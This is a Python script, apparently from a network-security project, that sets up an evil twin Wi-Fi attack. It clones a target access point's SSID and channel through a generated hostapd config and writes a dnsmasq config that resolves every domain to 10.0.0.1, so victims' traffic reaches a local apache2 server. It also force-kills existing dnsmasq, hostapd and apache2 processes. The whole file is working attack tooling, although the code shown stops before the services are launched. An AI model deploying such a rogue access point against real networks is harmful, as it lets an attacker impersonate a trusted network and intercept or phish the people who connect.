#!/usr/bin/python

import subprocess
from argparse import ArgumentParser

DIR_PATH = '/home/lioz/Desktop/Lioz/Defends Network/eviltwin'

HOSTAPD_CONF = DIR_PATH + '/Configuration/hostapd.conf'
HOSTAPD_DEFAULT_DRIVER = 'nl80211'
# g - Range frequency - 2.4 - 5.0 GH (Optimal according to GeeksForGeeks)
HOSTAPD_DEFAULT_HW_MODE = 'g'

DNSMASQ_CONF = DIR_PATH + '/Configuration/dnsmasq.conf'
DNSMASQ_LOG = DIR_PATH + '/Log/dnsmasq.log'

def set_configs():

    parser = ArgumentParser()

    parser.add_argument('-u',
                dest='upstream',
                required=True,
                type=str,
                metavar='<upstream interface>',
                help='Use this interface as access point.')

    parser.add_argument('-i',
            dest='phys',
            required=True,
            type=str,
            metavar='<phys interface>',
            help='Use this interface as connectivity one.')

    parser.add_argument('-s',
                dest='ssid',
                required=True,
                type=str,
                metavar='<ssid>',
                help='The ssid of the target ap.')

    parser.add_argument('-c',
                dest='channel',
                required=True,
                type=int,
                metavar='<channel>',
                help='The channel of the target ap.')

    args = parser.parse_args()
    
    return {
        'upstream' : args.upstream,
        'ssid' : args.ssid,
        'channel' : args.channel,
        'phys' : args.phys
    }

def display_configs(configs):

    print
    print ('[+] Access Point interface:', configs['phys'])
    print ('[+] Upstream interface:', configs['upstream'])
    print ('[+] Target AP Name:', configs['ssid'])
    print ('[+] Target AP Channel:', configs['channel'])
    print

def kill_daemons():

    print ('[*] Killing existing dnsmasq , hostapd and apache2 processes.')
    print 

    bash_command('killall dnsmasq')
    bash_command('killall hostapd')
    bash_command('killall apache2')

    print
    print ('[*] Continuing...')

def bash_command(command):

	command = command.split()
	p = subprocess.Popen(command, stdout=subprocess.PIPE)
    # Execute
	p.communicate()

class HostAPD(object):

    _instance = None
    
    def __init__(self):
        
        self.running = False
        self.conf = HOSTAPD_CONF

    @staticmethod
    def get_instance():
        
        if HostAPD._instance is None:
            HostAPD._instance = HostAPD()
        return HostAPD._instance

    def stop(self):

        bash_command('pkill -9 hostapd')

    def configure(self,
            phys,
            ssid,
            channel,
            driver=HOSTAPD_DEFAULT_DRIVER,
            hw_mode=HOSTAPD_DEFAULT_HW_MODE):

        with open(self.conf, 'w') as fd:
        
            fd.write('\n'.join([
                'interface=%s' % phys,
                'driver=%s' % driver,
                'ssid=%s' % ssid,
                'channel=%d' % channel,
                'hw_mode=%s' % hw_mode
            ]))


class DNSMasq(object):

    _instance = None
    
    def __init__(self):
        
        self.running = False
        self.conf = DNSMASQ_CONF

    @staticmethod
    def get_instance():
        
        if DNSMasq._instance is None:
            DNSMasq._instance = DNSMasq()
        return DNSMasq._instance

    def stop(self):

        bash_command('pkill -9 dnsmasq')

    def configure(self,
                phys,
                dhcp_range,
                dhcp_options=[],
                log_facility=DNSMASQ_LOG):

        with open(self.conf, 'w') as fd:
        
            fd.write('\n'.join([
                'log-facility=%s' % log_facility,
                'interface=%s' % phys,
                'dhcp-range=%s' % dhcp_range,
                '\n'.join('dhcp-option=%s' % o for o in dhcp_options),
                'address=/#/10.0.0.1',
                'log-queries',
                'log-dhcp'
            ]))


class APACHE2(object):

    _instance = None
    
    def __init__(self):
        
        self.running = False

    @staticmethod
    def get_instance():
        
        if APACHE2._instance is None:
            APACHE2._instance = APACHE2()
        return APACHE2._instance

    def stop(self):

        bash_command('pkill -9 apache2')
